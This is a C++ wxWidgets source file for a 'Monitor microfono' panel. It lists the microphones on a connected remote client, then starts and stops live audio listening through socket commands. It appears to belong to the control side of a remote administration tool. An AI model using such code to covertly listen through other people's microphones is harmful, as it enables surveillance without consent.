#include "panel_microfono.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;

wxBEGIN_EVENT_TABLE(panelMicrophone, wxFrame)
    EVT_BUTTON(EnumIDS::ID_Panel_Mic_BTN_Refresh, panelMicrophone::OnRefrescarDispositivos)
    EVT_BUTTON(EnumIDS::ID_Panel_Mic_BTN_Escuchar, panelMicrophone::OnEscuchar)
    EVT_BUTTON(EnumIDS::ID_Panel_Mic_BTN_Detener, panelMicrophone::OnDetener)
wxEND_EVENT_TABLE()

//Microfono
panelMicrophone::panelMicrophone(wxWindow* pParent, SOCKET sck_socket, std::string strID) :
    wxFrame(pParent, EnumIDS::ID_Panel_Microphone, "[" + strID + "] Monitor microfono", wxDefaultPosition, wxDefaultSize) {

    this->SetName(strID + "-mic");
    this->sckSocket = sck_socket;
    this->strID = strID;

    wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);
    wxBoxSizer* row_sizer1 = new wxBoxSizer(wxHORIZONTAL);
    wxBoxSizer* row_sizer2 = new wxBoxSizer(wxHORIZONTAL);



    this->mic_devices = new wxComboBox(this, EnumIDS::ID_Panel_Mic_CMB_Devices, "...", wxDefaultPosition, wxDefaultSize);
    wxButton* mic_refresh_devices = new wxButton(this, EnumIDS::ID_Panel_Mic_BTN_Refresh, "Refrescar lista");
    wxStaticText* lbl1 = new wxStaticText(this, wxID_ANY, "Dispositivos: ");

    row_sizer1->Add(lbl1, 0, wxALL, 1);
    row_sizer1->Add(this->mic_devices, 1, wxALL, 1);
    row_sizer1->Add(mic_refresh_devices, 1, wxALL, 1);

    main_sizer->Add(row_sizer1, 0, wxALL, 1);

    wxButton* mic_start_live = new wxButton(this, EnumIDS::ID_Panel_Mic_BTN_Escuchar, "Escuchar");
    wxButton* mic_start_rec = new wxButton(this, EnumIDS::ID_Panel_Mic_BTN_Detener, "Detener");

    row_sizer2->Add(mic_start_live, 0, wxALL, 1);
    row_sizer2->Add(mic_start_rec, 0, wxALL, 1);

    main_sizer->Add(row_sizer2, 0, wxALL, 1);

    this->SetSizer(main_sizer);


}

void panelMicrophone::OnRefrescarDispositivos(wxCommandEvent& event) {
    std::string strComando = DUMMY_PARAM;
    this->EnviarComando(strComando, EnumComandos::Mic_Refre_Dispositivos);
}

void panelMicrophone::OnEscuchar(wxCommandEvent& event) {

    wxString str_device_id = this->mic_devices->GetStringSelection();

    //Quien tiene mas de 10 microfonos :v ?
    std::string strComando = "";
    strComando.append(1, str_device_id[1]);

    this->EnviarComando(strComando, EnumComandos::Mic_Iniciar_Escucha);
}

void panelMicrophone::OnDetener(wxCommandEvent& event) {
    std::string strComando = DUMMY_PARAM;
    this->EnviarComando(strComando, EnumComandos::Mic_Detener_Escucha);

    int iIndex = p_Servidor->IndexOf(this->strID);
    if (iIndex >= 0) {
        p_Servidor->vc_Clientes[iIndex]->ClosePlayer();
    }else {
        DEBUG_MSG("No se pudo encontrar el cliente con id" + this->strID);
    }
}

void panelMicrophone::EnviarComando(std::string pComando, int iComando) {
    p_Servidor->cChunkSend(this->sckSocket, pComando.c_str(), pComando.size() + 1, 0, false, iComando);
}

void panelMicrophone::ProcesarLista(const char*& pBuffer) {
    std::vector<std::string> vcMics = strSplit(std::string(pBuffer), CMD_DEL, 15); //15 maximo :v
    if (vcMics.size() > 0) {
        wxArrayString arrMics;
        for (const std::string& cMic : vcMics) {
            arrMics.push_back(cMic);
        }
        if (this->mic_devices) {
            this->mic_devices->Clear();
            this->mic_devices->Append(arrMics);
        }
    } else{
        DEBUG_MSG("No se pudo parsear la info de microfonos");
        DEBUG_MSG(pBuffer);
    }
}